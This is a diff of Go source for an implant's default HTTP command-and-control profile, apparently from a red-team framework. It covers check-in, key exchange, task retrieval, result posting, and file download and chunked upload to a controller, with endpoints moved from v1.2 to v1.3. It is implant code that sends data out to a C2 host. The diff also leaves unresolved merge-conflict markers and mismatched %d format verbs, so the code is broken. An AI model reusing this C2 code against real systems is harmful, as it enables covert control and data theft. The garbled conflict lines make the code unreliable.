@@ -1,4 +1,4 @@
-// +build default,linux darwin windows
+// +build default
 
 package profiles
 
@@ -35,7 +35,7 @@ type C2Default struct {
 	RsaPrivateKey  *rsa.PrivateKey
 }
 
-func (c C2Default) NewProfile() Profile {
+func newProfile() Profile {
 	return &C2Default{}
 }
 
@@ -153,22 +153,23 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interf
 	if c.ExchangingKeys {
 		sID := c.NegotiateKey()
 
-		endpoint := fmt.Sprintf("api/v1.2/crypto/EKE/%s", sID)
+		endpoint := fmt.Sprintf("api/v1.3/crypto/EKE/%s", sID)
 		resp = c.htmlPostData(endpoint, checkinMsg)
 
 	} else if len(c.AesPSK) != 0 {
 		// If we're using a static AES key, then just hit the aes_psk endpoint
-		endpoint := fmt.Sprintf("api/v1.2/crypto/aes_psk/%s", c.UUID)
+		endpoint := fmt.Sprintf("api/v1.3/crypto/aes_psk/%s", c.UUID)
 		resp = c.htmlPostData(endpoint, checkinMsg)
 	} else {
 		// If we're not using encryption, we hit the callbacks endpoint directly
-		resp = c.htmlPostData("api/v1.2/callbacks/", checkinMsg)
+		resp = c.htmlPostData("api/v1.3/callbacks/", checkinMsg)
 		//log.Printf("Raw HTMLPostData response: %s\n", string(resp))
 	}
 
 	// save the apfell id
 	respMsg := structs.CheckinResponse{}
 	err := json.Unmarshal(resp, &respMsg)
+	//log.Printf("Raw response: %s", string(resp))
 	if err != nil {
 		log.Println("message:\n", string(resp))
 		log.Printf("Error in unmarshal:\n %s", err.Error())
@@ -181,7 +182,11 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interf
 //GetTasking - retrieve new tasks
 func (c *C2Default) GetTasking() interface{} {
 	//log.Printf("Current C2Default config: %+v\n", c)
+<<<<<<< HEAD
 	url := fmt.Sprintf("%sapi/v1.2/tasks/callback/%s/nextTask", c.BaseURL, c.ApfellID)
+=======
+	url := fmt.Sprintf("%sapi/v1.3/tasks/callback/%s/nextTask", c.BaseURL, c.ApfellID)
+>>>>>>> master
 	rawTask := c.htmlGetData(url)
 	//log.Println("Raw HTMLGetData response: ", string(rawTask))
 	task := structs.Task{}
@@ -196,7 +201,11 @@ func (c *C2Default) GetTasking() interface{} {
 
 //PostResponse - Post task responses
 func (c *C2Default) PostResponse(task structs.Task, output string) []byte {
+<<<<<<< HEAD
 	urlEnding := fmt.Sprintf("api/v1.2/responses/%s", task.ID)
+=======
+	urlEnding := fmt.Sprintf("api/v1.3/responses/%s", task.ID)
+>>>>>>> master
 	return c.postRESTResponse(urlEnding, []byte(output))
 }
 
@@ -338,7 +347,7 @@ func (c *C2Default) NegotiateKey() string {
 	}
 
 	// Send the request to the EKE endpoint
-	urlSuffix := fmt.Sprintf("api/v1.2/crypto/EKE/%s", c.UUID)
+	urlSuffix := fmt.Sprintf("api/v1.3/crypto/EKE/%s", c.UUID)
 
 	resp := c.htmlPostData(urlSuffix, unencryptedMsg)
 	// Decrypt & Unmarshal the response
@@ -405,7 +414,11 @@ func (c *C2Default) GetFile(fileid string) []byte {
 //Upload the data
 func (c *C2Default) Upload(task structs.Task, fileid string) []byte {
 
+<<<<<<< HEAD
 	url := fmt.Sprintf("api/v1.2/files/%s/callbacks/%s", fileid, c.ApfellID)
+=======
+	url := fmt.Sprintf("api/v1.3/files/%s/callbacks/%d", fileid, c.ApfellID)
+>>>>>>> master
 	encfileData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url))
 
 	//decFileData := c.decryptMessage(encfileData)
@@ -462,7 +475,11 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 		tResp.Response = base64.StdEncoding.EncodeToString(encmsg)
 		dataToSend, _ := json.Marshal(tResp)
 
+<<<<<<< HEAD
 		endpoint := fmt.Sprintf("api/v1.2/responses/%s", task.ID)
+=======
+		endpoint := fmt.Sprintf("api/v1.3/responses/%d", task.ID)
+>>>>>>> master
 		resp := c.htmlPostData(endpoint, dataToSend)
 		postResp := structs.FileChunkResponse{}
 		_ = json.Unmarshal(resp, &postResp)
